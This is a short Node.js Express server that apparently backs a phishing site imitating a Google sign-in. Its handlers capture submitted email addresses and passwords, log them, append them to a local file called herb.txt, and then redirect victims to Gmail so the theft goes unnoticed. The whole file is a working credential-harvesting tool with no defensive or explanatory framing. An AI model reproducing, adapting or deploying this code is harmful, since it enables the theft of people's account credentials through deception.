const express = require("express");
const fs = require('fs')
const bodyParser = require('body-parser');
const port = 553;
const app = express();

app.use(express.static('sssss'));
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: false })); 

console.log('online');

app.post('/', function (req, res) {
  console.log("posting")
  console.log("email: " + req.body.morbinus)
  //console.log("pw: " + req.body.hoonter)
  res.redirect(302, "google-usern-login-encrypted-secure/psw-login.html");

fs.appendFile("herb.txt", "email: " + req.body.morbinus, (err) => {
    if (err)
    console.log(err)
    else  {
      console.log('ob')
    }
  });
});

app.post('/google-usern-login-encrypted-secure/psw-login.html', function (req, res) {
  console.log("posting2")
  console.log("pw: " + req.body.hoonter)
  res.redirect(301, "https://www.gmail.com");
  res.end();

  fs.appendFile("herb.txt", "\npw: " + req.body.hoonter + "\n\n", (err) => {
    if (err)
    console.log(err)
    else  {
      console.log('ob')
    }
  });
});


/* 
fs.appendFile("herb.txt", "email: " + req.body.morbinus, (err) => {
  if (err)
  console.log(err)
  else  {
    console.log('ob')
  }
});
*/

app.listen(port, () => {console.log(`port ${port}`)});
